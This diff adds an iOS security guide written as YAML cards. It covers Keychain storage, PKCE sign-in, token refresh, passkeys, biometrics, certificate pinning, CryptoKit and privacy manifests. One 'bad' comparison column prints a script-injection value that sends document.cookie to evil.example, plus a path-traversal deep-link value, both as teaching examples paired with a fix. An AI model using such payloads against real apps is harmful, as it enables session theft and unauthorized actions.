@@ -1,0 +1,584 @@
+id: security
+concept: security.auth-and-data
+scope: platform
+title: "Security, Authentication & Privacy"
+group: iOS Practice
+subtitle: Where each secret lives, how sign-in actually works, and what must never leave the device — or reach a log.
+applies:
+  platforms:
+    - ios
+    - ipados
+    - visionos
+  requires:
+    - Security
+    - AuthenticationServices
+    - CryptoKit
+    - LocalAuthentication
+  versions:
+    swift: ">=6.2"
+    ios: ">=17"
+sources:
+  - title: Security — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/security
+  - title: Authentication Services — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/authenticationservices
+  - title: CryptoKit — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/cryptokit
+  - title: Local Authentication — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/localauthentication
+  - title: App Tracking Transparency — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/apptrackingtransparency
+  - title: Privacy manifest files — Apple Developer Documentation
+    url: https://developer.apple.com/documentation/bundleresources/privacy-manifest-files
+  - title: "RFC 7636 — Proof Key for Code Exchange (PKCE)"
+    url: https://www.rfc-editor.org/rfc/rfc7636
+  - title: "RFC 8252 — OAuth 2.0 for Native Apps"
+    url: https://www.rfc-editor.org/rfc/rfc8252
+cards:
+  - id: where-does-this-secret-go
+    kind: table
+    title: Where does this secret go?
+    note: Decide by "what does an attacker with the unlocked phone, a backup, or the IPA get?"
+    headers:
+      - Secret
+      - Put it in
+      - Protection class
+      - Never
+    rows:
+      - - Access + refresh tokens
+        - Keychain, generic password
+        - "`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` — background refresh can still read it"
+        - "`UserDefaults`, a plist, a file in Documents"
+      - - A credential worth a Face ID prompt (vault key, payment token)
+        - "Keychain + `SecAccessControl` with `.biometryCurrentSet`"
+        - "`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`"
+        - a Boolean "biometry passed" flag guarding a plain value
+      - - A signing key that must never be copied
+        - "Secure Enclave (`SecureEnclave.P256.Signing.PrivateKey`)"
+        - non-exportable; keep its `dataRepresentation` (an encrypted handle) in the Keychain
+        - exported key bytes anywhere
+      - - The key that encrypts a local database
+        - Keychain (the key bytes)
+        - "`AfterFirstUnlockThisDeviceOnly`"
+        - next to the file it encrypts
+      - - Sensitive user files (statements, scans)
+        - files with Data Protection
+        - "`.complete`, or `.completeUnlessOpen` while a download finishes"
+        - Caches or tmp with `.none`
+      - - A third-party API key or OAuth client secret
+        - your server, behind your own authenticated endpoint
+        - —
+        - "the binary: `strings` on the IPA finds it in seconds"
+      - - Preferences, feature flags, onboarding state
+        - "`UserDefaults`"
+        - "the default (`completeUntilFirstUserAuthentication`) — a plaintext plist anyone with the unlocked device or an unencrypted backup can read"
+        - anything in the rows above
+      - - Proof a request comes from your genuine, unmodified app
+        - "App Attest (`DCAppAttestService`): a Secure Enclave key Apple attests; `DeviceCheck` for two bits per device"
+        - the attested key never leaves the device; the server verifies the attestation and each assertion
+        - a "secret" baked into the binary to sign requests
+      - - The user's password
+        - "nowhere: AutoFill with `.textContentType(.password)`, or a passkey"
+        - —
+        - your own storage, in any form
+  - id: a-small-keychain-wrapper
+    kind: code
+    title: A small Keychain wrapper
+    note: Update-then-add, so a second save never fails with `errSecDuplicateItem` and never deletes first.
+    code: |-
+      import Security
+
+      struct KeychainError: Error { let status: OSStatus }   // SecCopyErrorMessageString for text
+
+      /// Generic-password items for one service. Callers encode their values to Data.
+      struct Keychain: Sendable {
+        let service: String                       // "com.example.ledger.auth"
+
+        private func query(_ account: String) -> [String: Any] {
+          [kSecClass as String: kSecClassGenericPassword,
+           kSecAttrService as String: service,
+           kSecAttrAccount as String: account]
+        }
+
+        func save(_ value: Data, for account: String) throws {
+          let attributes: [String: Any] = [
+            kSecValueData as String: value,
+            // readable after the first unlock since boot; never restored onto another device
+            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly,
+          ]
+          var status = SecItemUpdate(query(account) as CFDictionary, attributes as CFDictionary)
+          if status == errSecItemNotFound {
+            status = SecItemAdd(query(account).merging(attributes) { $1 } as CFDictionary, nil)
+          }
+          guard status == errSecSuccess else { throw KeychainError(status: status) }
+        }
+
+        func read(_ account: String) throws -> Data? {
+          let lookup = query(account).merging([kSecReturnData as String: true,
+                                               kSecMatchLimit as String: kSecMatchLimitOne]) { $1 }
+          var result: CFTypeRef?
+          let status = SecItemCopyMatching(lookup as CFDictionary, &result)
+          if status == errSecItemNotFound { return nil }
+          guard status == errSecSuccess else { throw KeychainError(status: status) }
+          return result as? Data
+        }
+
+        func delete(_ account: String) throws {
+          let status = SecItemDelete(query(account) as CFDictionary)
+          guard [errSecSuccess, errSecItemNotFound].contains(status) else { throw KeychainError(status: status) }
+        }
+      }
+  - id: pkce-verifier-challenge-and-authorize-url
+    kind: code
+    title: "PKCE: verifier, challenge and the authorize URL"
+    note: An app is a public client with no secret — PKCE is what stops an intercepted code from being redeemed.
+    code: |-
+      import CryptoKit
+      import Foundation
+      import Security
+
+      struct PKCE: Sendable {
+        let verifier: String          // stays in memory until the token exchange, then is dropped
+        let challenge: String         // the only half that travels to the authorize page
+
+        init() throws {
+          var bytes = [UInt8](repeating: 0, count: 32)          // 32 bytes → 43 chars, the RFC minimum
+          guard SecRandomCopyBytes(kSecRandomDefault, bytes.count, &bytes) == errSecSuccess else {
+            throw PKCEError.noRandomness
+          }
+          verifier = Data(bytes).base64URLEncodedString()
+          challenge = Data(SHA256.hash(data: Data(verifier.utf8))).base64URLEncodedString()
+        }
+      }
+
+      extension Data {
+        /// base64url: URL-safe alphabet, no padding (RFC 7636 appendix A)
+        func base64URLEncodedString() -> String {
+          base64EncodedString()
+            .replacingOccurrences(of: "+", with: "-")
+            .replacingOccurrences(of: "/", with: "_")
+            .replacingOccurrences(of: "=", with: "")
+        }
+      }
+
+      func authorizeURL(pkce: PKCE, state: String) -> URL {
+        var components = URLComponents(string: "https://auth.example.com/authorize")!
+        components.queryItems = [
+          URLQueryItem(name: "response_type", value: "code"),
+          URLQueryItem(name: "client_id", value: "ledger-ios"),
+          // RFC 8252 §7.1: a private scheme is your domain reversed, never a short word like "ledger"
+          URLQueryItem(name: "redirect_uri", value: "com.example.ledger:/oauth/callback"),
+          URLQueryItem(name: "scope", value: "openid offline_access"),  // offline_access → refresh token
+          URLQueryItem(name: "state", value: state),                      // random per attempt
+          URLQueryItem(name: "code_challenge", value: pkce.challenge),
+          URLQueryItem(name: "code_challenge_method", value: "S256"),    // never "plain"
+        ]
+        return components.url!
+      }
+  - id: the-login-page-with-aswebauthenticationsession
+    kind: code
+    title: The login page with ASWebAuthenticationSession
+    note: "The system browser sheet the app cannot read into (SwiftUI views can also use `@Environment(\\.webAuthenticationSession)`)."
+    code: |-
+      import AuthenticationServices
+
+      @available(iOS 17.4, *)                                 // init(url:callback:completionHandler:)
+      @MainActor
+      final class WebSignIn: NSObject, ASWebAuthenticationPresentationContextProviding {
+        private let anchor: ASPresentationAnchor
+
+        init(anchor: ASPresentationAnchor) { self.anchor = anchor }
+
+        /// Shows the provider's page and returns the one-time authorization code.
+        func authorizationCode(pkce: PKCE, state: String) async throws -> String {
+          // The session keeps itself alive until it calls the handler, so no stored reference is needed.
+          let redirect: URL = try await withCheckedThrowingContinuation { continuation in
+            let session = ASWebAuthenticationSession(
+              url: authorizeURL(pkce: pkce, state: state),
+              callback: .customScheme("com.example.ledger")     // better still: .https(host:path:)
+            ) { url, error in
+              if let url {
+                continuation.resume(returning: url)
+              } else {
+                continuation.resume(throwing: error ?? AuthError.invalidCallback)
+              }
+            }
+            session.presentationContextProvider = self
+            session.prefersEphemeralWebBrowserSession = true    // no shared Safari cookies
+            session.start()
+          }
+
+          let items = URLComponents(url: redirect, resolvingAgainstBaseURL: false)?.queryItems ?? []
+          // `state` ties this redirect to THIS attempt: reject injected or replayed codes.
+          guard items.first(where: { $0.name == "state" })?.value == state,
+                let code = items.first(where: { $0.name == "code" })?.value else {
+            throw AuthError.invalidCallback
+          }
+          return code
+        }
+
+        func presentationAnchor(for session: ASWebAuthenticationSession) -> ASPresentationAnchor { anchor }
+      }
+
+      // The user tapping Cancel arrives as ASWebAuthenticationSessionError.canceledLogin: no alert.
+      // Cancelling the calling Task does NOT close the sheet. And session.cancel() dismisses it without
+      // calling the handler, so a wrapper that cancels must resume the continuation itself, exactly once.
+  - id: tokens-exchange-storage-and-refresh
+    kind: code
+    title: "Tokens: exchange, storage and a single refresh"
+    note: One actor owns the tokens, so ten requests that find an expired token share one refresh and its outcome, and a response without a new refresh token keeps the old one.
+    code: |-
+      struct Tokens: Codable, Sendable {
+        var access, refresh: String
+        var expiresAt: Date
+      }
+
+      actor TokenStore {
+        private let keychain = Keychain(service: "com.example.ledger.auth")
+        private let post: @Sendable ([String: String]) async throws -> TokenResponse
+        private var refreshTask: Task<Tokens, Error>?
+
+        init(post: @escaping @Sendable ([String: String]) async throws -> TokenResponse) { self.post = post }
+
+        func signIn(code: String, pkce: PKCE) async throws {     // one-time code + PKCE verifier → tokens
+          _ = try await store(post(["grant_type": "authorization_code", "code": code, "client_id": "ledger-ios",
+                                    "redirect_uri": "com.example.ledger:/oauth/callback",
+                                    "code_verifier": pkce.verifier]), keeping: nil)
+        }
+
+        func accessToken(now: Date = .now) async throws -> String {
+          if let refreshTask { return try await refreshTask.value.access }   // join the one in flight
+          guard let data = try keychain.read("tokens") else { throw AuthError.signedOut }
+          let current = try JSONDecoder().decode(Tokens.self, from: data)
+          if current.expiresAt.timeIntervalSince(now) > 60 { return current.access }  // 60 s skew margin
+
+          let task = Task {                // map errors INSIDE the shared task: every joiner sees them
+            do {
+              return try await store(post(["grant_type": "refresh_token", "client_id": "ledger-ios",
+                                           "refresh_token": current.refresh]), keeping: current.refresh)
+            } catch AuthError.refreshRejected {    // `post` throws this for HTTP 400 invalid_grant
+              try? keychain.delete("tokens")
+              throw AuthError.signedOut
+            }
+          }
+          refreshTask = task
+          defer { refreshTask = nil }
+          return try await task.value.access
+        }
+
+        private func store(_ response: TokenResponse, keeping oldRefresh: String?) throws -> Tokens {
+          guard let refresh = response.refreshToken ?? oldRefresh else { throw AuthError.signedOut }
+          let tokens = Tokens(access: response.accessToken, refresh: refresh,
+                              expiresAt: .now.addingTimeInterval(response.expiresIn))
+          try keychain.save(JSONEncoder().encode(tokens), for: "tokens")
+          return tokens
+        }
+      }
+  - id: sign-in-with-apple-and-passkeys
+    kind: code
+    title: Sign in with Apple and passkeys, in outline
+    note: "One `ASAuthorizationController` sheet offers both, and the server verifies what comes back, never the app."
+    code: |-
+      import AuthenticationServices
+
+      @MainActor
+      final class AccountSignIn: NSObject, ASAuthorizationControllerDelegate,
+                                 ASAuthorizationControllerPresentationContextProviding {
+        private let anchor: ASPresentationAnchor
+        private var continuation: CheckedContinuation<ASAuthorization, Error>?
+        init(anchor: ASPresentationAnchor) { self.anchor = anchor }
+
+        /// `challenge`: fresh, single-use, from YOUR server. Entitlement: webcredentials:ledger.example.com
+        func signIn(challenge: Data) async throws -> ASAuthorization {
+          guard continuation == nil else { throw ASAuthorizationError(.notHandled) }  // one sheet at a time
+          let passkey = ASAuthorizationPlatformPublicKeyCredentialProvider(
+            relyingPartyIdentifier: "ledger.example.com"
+          ).createCredentialAssertionRequest(challenge: challenge)
+
+          let apple = ASAuthorizationAppleIDProvider().createRequest()
+          apple.requestedScopes = [.email]      // ask for what you use; name and email arrive ONCE
+
+          let controller = ASAuthorizationController(authorizationRequests: [passkey, apple])
+          controller.delegate = self
+          controller.presentationContextProvider = self
+          return try await withCheckedThrowingContinuation { continuation in
+            self.continuation = continuation
+            controller.performRequests()
+          }
+        }
+
+        func authorizationController(controller: ASAuthorizationController,
+                                     didCompleteWithAuthorization authorization: ASAuthorization) {
+          continuation?.resume(returning: authorization)
+          continuation = nil
+        }
+
+        func authorizationController(controller: ASAuthorizationController,
+                                     didCompleteWithError error: Error) {
+          continuation?.resume(throwing: error)
+          continuation = nil
+        }
+
+        func presentationAnchor(for controller: ASAuthorizationController) -> ASPresentationAnchor { anchor }
+      }
+      // Server receives: an AppleIDCredential's identityToken (a JWT) + authorizationCode, or a passkey
+      // assertion's credentialID, rawAuthenticatorData, rawClientDataJSON and signature.
+      // New passkey: createCredentialRegistrationRequest(challenge:name:userID:) on the same provider.
+  - id: biometrics-bound-to-a-keychain-item
+    kind: code
+    title: Biometrics, bound to a Keychain item
+    note: A Face ID "yes" held in memory protects nothing, while an item the Secure Enclave only releases after Face ID does.
+    code: |-
+      import LocalAuthentication
+      import Security
+
+      /// The item can only be read after a successful Face ID / Touch ID match.
+      func saveBehindBiometry(_ secret: Data, account: String) throws {
+        var error: Unmanaged<CFError>?
+        guard let access = SecAccessControlCreateWithFlags(
+          nil,
+          kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,  // deleted if the passcode is turned off
+          .biometryCurrentSet,                              // invalidated when a new face/finger enrols
+          &error
+        ) else { throw error!.takeRetainedValue() as Error }
+
+        let item: [String: Any] = [kSecClass as String: kSecClassGenericPassword,
+                                   kSecAttrService as String: "vault", kSecAttrAccount as String: account]
+        SecItemDelete(item as CFDictionary)                 // access control cannot be updated in place
+        let add = item.merging([kSecAttrAccessControl as String: access,
+                                kSecValueData as String: secret]) { $1 }
+        let status = SecItemAdd(add as CFDictionary, nil)
+        guard status == errSecSuccess else { throw KeychainError(status: status) }
+      }
+
+      /// Shows the system prompt. @concurrent: SecItemCopyMatching blocks until the user answers.
+      @concurrent
+      func readBehindBiometry(account: String) async throws -> Data {
+        let context = LAContext()
+        context.localizedReason = "Unlock your Ledger vault"
+        let query: [String: Any] = [kSecClass as String: kSecClassGenericPassword,
+                                    kSecAttrService as String: "vault", kSecAttrAccount as String: account,
+                                    kSecReturnData as String: true,
+                                    kSecUseAuthenticationContext as String: context]
+        var result: CFTypeRef?
+        let status = SecItemCopyMatching(query as CFDictionary, &result)
+        guard status == errSecSuccess, let data = result as? Data else {
+          throw KeychainError(status: status)               // errSecUserCanceled, errSecAuthFailed…
+        }
+        return data
+      }
+
+      // Only gating a screen? LAContext().evaluatePolicy(.deviceOwnerAuthentication, localizedReason:)
+      // falls back to the passcode. Either way Info.plist needs NSFaceIDUsageDescription.
+  - id: transport-security-and-certificate-pinning
+    kind: code
+    title: Transport security and certificate pinning
+    note: "ATS already enforces HTTPS with TLS 1.2+ and forward secrecy (exceptions per domain, never `NSAllowsArbitraryLoads`), so pin only when the threat model needs it, and always ship a backup pin."
+    code: |-
+      import CryptoKit
+      import Security
+
+      // Pins are base64 SHA-256 of the SPKI — the format NSPinnedDomains (iOS 14+) and openssl use:
+      //   openssl x509 -in cert.pem -pubkey -noout | openssl pkey -pubin -outform der \
+      //     | openssl dgst -sha256 -binary | base64
+      final class PinningDelegate: NSObject, URLSessionDelegate, Sendable {
+        private let pins: Set<String>            // the live key AND a backup key not deployed yet
+
+        init(pins: Set<String>) { self.pins = pins }
+
+        func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge)
+          async -> (URLSession.AuthChallengeDisposition, URLCredential?) {
+          guard challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
+                let trust = challenge.protectionSpace.serverTrust else { return (.performDefaultHandling, nil) }
+
+          guard SecTrustEvaluateWithError(trust, nil),         // chain + hostname first: pinning only adds
+                let chain = SecTrustCopyCertificateChain(trust) as? [SecCertificate] else {
+            return (.cancelAuthenticationChallenge, nil)
+          }
+
+          let pinned = chain.contains { $0.spkiSHA256.map(pins.contains) ?? false }
+          return pinned ? (.useCredential, URLCredential(trust: trust)) : (.cancelAuthenticationChallenge, nil)
+        }
+      }
+
+      extension SecCertificate {
+        var spkiSHA256: String? {
+          guard let key = SecCertificateCopyKey(self),
+                let raw = SecKeyCopyExternalRepresentation(key, nil) as Data?,  // bare key: PKCS#1 / X9.63
+                let attributes = SecKeyCopyAttributes(key) as? [CFString: Any],
+                let type = attributes[kSecAttrKeyType] as? String,
+                let bits = attributes[kSecAttrKeySizeInBits] as? Int else { return nil }
+
+          guard let header = spkiHeaders["\(type)/\(bits)"] else {
+            assertionFailure("No SPKI header for key type \(type)/\(bits): this pin can never match")
+            return nil
+          }
+          return Data(SHA256.hash(data: header + raw)).base64EncodedString()
+        }
+      }
+
+      private let spkiHeaders: [String: Data] = [
+        "\(kSecAttrKeyTypeECSECPrimeRandom)/256": Data(base64Encoded: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgA=")!,
+        "\(kSecAttrKeyTypeECSECPrimeRandom)/384": Data(base64Encoded: "MHYwEAYHKoZIzj0CAQYFK4EEACIDYgA=")!,
+        "\(kSecAttrKeyTypeRSA)/2048": Data(base64Encoded: "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A")!,
+        "\(kSecAttrKeyTypeRSA)/4096": Data(base64Encoded: "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8A")!,
+      ]
+  - id: cryptokit-hash-mac-encrypt-agree
+    kind: code
+    title: "CryptoKit: hash, authenticate, encrypt — to a key and to a server"
+    note: Reach for the authenticated primitives and HPKE, which leave no unauthenticated mode to get wrong.
+    code: |-
+      import CryptoKit
+      import Foundation
+
+      let receipt = Data(#"{"order":"A-1042","total":"49.90"}"#.utf8)
+
+      // Hash: integrity checks and dedupe keys. Too fast for passwords — servers use a slow KDF.
+      let hex = SHA256.hash(data: receipt).map { String(format: "%02x", $0) }.joined()
+
+      // HMAC: prove the sender holds the key (signing a webhook or a request); the check is constant-time
+      let signingKey = SymmetricKey(size: .bits256)
+      let mac = HMAC<SHA256>.authenticationCode(for: receipt, using: signingKey)
+      let genuine = HMAC<SHA256>.isValidAuthenticationCode(mac, authenticating: receipt, using: signingKey)
+
+      // AES-GCM: confidentiality AND tamper detection. The key lives in the Keychain, not by the file.
+      let fileKey = SymmetricKey(size: .bits256)
+      let onDisk = try AES.GCM.seal(receipt, using: fileKey).combined!   // nonce ‖ ciphertext ‖ tag
+      let opened = try AES.GCM.open(AES.GCM.SealedBox(combined: onDisk), using: fileKey)  // throws if altered
+
+      // ChaChaPoly: same contract, with its own key; fast where there is no AES hardware
+      let syncKey = SymmetricKey(size: .bits256)
+      let box = try ChaChaPoly.seal(receipt, using: syncKey)
+      let back = try ChaChaPoly.open(ChaChaPoly.SealedBox(combined: box.combined), using: syncKey)
+
+      // Encrypting TO a server's public key: HPKE (RFC 9180, iOS 17+), not a home-made ECDH + HKDF.
+      // serverKey must be authentic: shipped in the app, or signature-checked with a key you ship.
+      let suite = HPKE.Ciphersuite.Curve25519_SHA256_ChachaPoly
+      let info = Data("ledger-sync-v1".utf8)                                 // binds the context
+      var sender = try HPKE.Sender(recipientKey: serverKey, ciphersuite: suite, info: info)  // fresh key
+      let sealed = try sender.seal(receipt)
+      // Send sender.encapsulatedKey + sealed. The server, holding the private key, opens it:
+      var recipient = try HPKE.Recipient(privateKey: serverPrivateKey, ciphersuite: suite, info: info,
+                                         encapsulatedKey: sender.encapsulatedKey)
+      let received = try recipient.open(sealed)
+
+      // Secure Enclave: keys that never leave the chip — P-256, plus ML-KEM / ML-DSA from iOS 26
+      if SecureEnclave.isAvailable {
+        let enclaveKey = try SecureEnclave.P256.Signing.PrivateKey()
+        let signature = try enclaveKey.signature(for: receipt)
+        let keyHandle = enclaveKey.dataRepresentation          // opaque; useless off this device
+      }
+  - id: untrusted-input-and-what-never-reaches-a-log
+    kind: compare
+    title: Untrusted input, and what never reaches a log
+    note: A deep link, a push payload, the pasteboard and a web page are all attacker-controlled strings.
+    columns:
+      - label: Injectable and leaky
+        tone: bad
+        code: |-
+          // com.example.ledger://open?page=…&note=…
+          @MainActor
+          func open(_ url: URL, in webView: WKWebView, session: Session) {
+            let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems ?? []
+            let page = items.first { $0.name == "page" }?.value ?? ""
+            let note = items.first { $0.name == "note" }?.value ?? ""
+
+            // page = "../account/close?confirm=1" → WebKit resolves it to /account/close?confirm=1:
+            // any page on your domain, loaded with the user's session
+            webView.load(URLRequest(url: URL(string: "https://ledger.example.com/\(page)")!))
+
+            // …and once the page has loaded (WKNavigationDelegate didFinish):
+            // note = "');fetch('//evil.example?c='+document.cookie);('" runs as script
+            webView.evaluateJavaScript("showNote('\(note)')")
+
+            // NSLog is never redacted; .public opts a value out of redaction on purpose
+            NSLog("Deep link %@ for %@", url.absoluteString, session.email)
+            logger.info("Using token \(session.accessToken, privacy: .public)")
+          }
+          // Same mistake elsewhere: SQL built with "\(input)", NSPredicate(format: "name == '\(input)'")
+      - label: Allow-listed and redacted
+        tone: good
+        code: |-
+          enum Page: String { case statements, budgets, settings }    // the only reachable screens
+
+          @MainActor
+          func open(_ url: URL, in webView: WKWebView, session: Session) async throws {
+            let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems ?? []
+            guard let page = items.first(where: { $0.name == "page" })?.value.flatMap(Page.init)
+            else { return }                                         // unknown → ignore, don't guess
+            let note = items.first { $0.name == "note" }?.value ?? ""
+
+            let base = URL(string: "https://ledger.example.com")!
+            webView.load(URLRequest(url: base.appending(path: page.rawValue)))
+
+            // …once the page has loaded: data travels as an ARGUMENT, so it can never become code
+            _ = try await webView.callAsyncJavaScript("showNote(note)", arguments: ["note": note],
+                                                      contentWorld: .page)
+
+            // Log the shape of the event, never tokens, emails, bodies or full URLs
+            let user = session.userID
+            logger.info("Opened \(page.rawValue, privacy: .public) for \(user, privacy: .private(mask: .hash))")
+          }
+          // Same rule elsewhere: sqlite3_bind_text(…), NSPredicate(format: "name == %@", input)
+  - id: privacy-purpose-strings-tracking-and-the-manifest
+    kind: table
+    title: "Privacy: purpose strings, tracking and the manifest"
+    note: Each row is checked at review time or crashes at runtime — none of them is optional.
+    headers:
+      - Concern
+      - Where it lives
+      - What to get right
+    rows:
+      - - Camera, photos, location, contacts, Face ID
+        - "`NS…UsageDescription` keys in Info.plist"
+        - a missing key **crashes** on first access; say what the user gets — "Scan receipts to add expenses"
+      - - When to ask
+        - at the moment of use
+        - request after the user taps "Scan receipt", never at launch; a denial must leave a working app
+      - - Tracking across other companies' apps or sites
+        - "`NSUserTrackingUsageDescription` + `ATTrackingManager.requestTrackingAuthorization()`"
+        - ask only while the app is active; until `.authorized` the IDFA is all zeros and you may not track
+      - - Data you collect
+        - "`PrivacyInfo.xcprivacy` → `NSPrivacyCollectedDataTypes`"
+        - must match the App Store privacy label; linked-to-identity and used-for-tracking are separate flags
+      - - Required-reason APIs
+        - "`PrivacyInfo.xcprivacy` → `NSPrivacyAccessedAPITypes`"
+        - "`UserDefaults`, file timestamps, boot time, disk space each need an approved reason code (`CA92.1` for your own defaults)"
+      - - Tracking domains
+        - "`NSPrivacyTracking`, `NSPrivacyTrackingDomains`"
+        - listed domains get no network access until the user allows tracking
+      - - Third-party SDKs
+        - each SDK's own signed privacy manifest
+        - Xcode merges them; review the Organizer's privacy report for every archive
+      - - Data minimisation
+        - your models and APIs
+        - "collect less: `requestedScopes = [.email]`, reduced-accuracy location, delete server data when the account is deleted (required by App Review)"
+  - id: pitfalls
+    kind: rules
+    title: Pitfalls
+    note: The findings that come up in every mobile security review.
+    items:
+      - tone: bad
+        text: "**A client secret in the app.** Anything in the binary is public. Native apps are public clients: PKCE replaces the secret, a server proxies third-party keys, and App Attest tells the server the request came from your genuine app."
+      - tone: bad
+        text: "**Sign-out that only forgets the token locally.** Revoke the refresh token at the server (RFC 7009 `/revoke`), then delete the Keychain items, caches and files tied to the account."
+      - tone: bad
+        text: "**Logging in through a `WKWebView`.** The app can read the password, the user can't see the real address bar, and Google refuses it. Use `ASWebAuthenticationSession`."
+      - tone: bad
+        text: "**Skipping the `state` check** on the redirect — any app that registers your custom scheme can inject a code. Prefer a universal-link callback (`.https(host:path:)`)."
+      - tone: bad
+        text: "**Biometry as a Boolean gate** in front of a value stored in plain `UserDefaults`. Bind the secret to the Keychain item with `SecAccessControl`."
+      - tone: bad
+        text: "**Keychain items outlive the app.** A reinstall finds the old tokens: clear them on the first launch (a `UserDefaults` flag that is gone after deletion)."
+      - tone: bad
+        text: "**`NSAllowsArbitraryLoads`** to make one HTTP endpoint work. Fix the server or scope an exception to that one domain."
+      - tone: bad
+        text: "**Pinning a single leaf certificate** with no backup key and no remote kill switch: the next renewal is a production outage."
+      - tone: bad
+        text: "**`privacy: .public` on anything a user typed or a server issued**, and `NSLog`/`print` of request bodies or headers. Logs end up in sysdiagnoses and bug reports."
+      - tone: good
+        text: "**Hide sensitive screens from the app-switcher snapshot**: cover them when `scenePhase` becomes `.inactive`."
+      - tone: good
+        text: "**Use `.privacySensitive()`** on views showing balances or codes so widgets and the lock screen redact them."
+      - tone: neutral
+        text: "Jailbreak detection and obfuscation slow an attacker down; they never replace authorisation checks on the server."
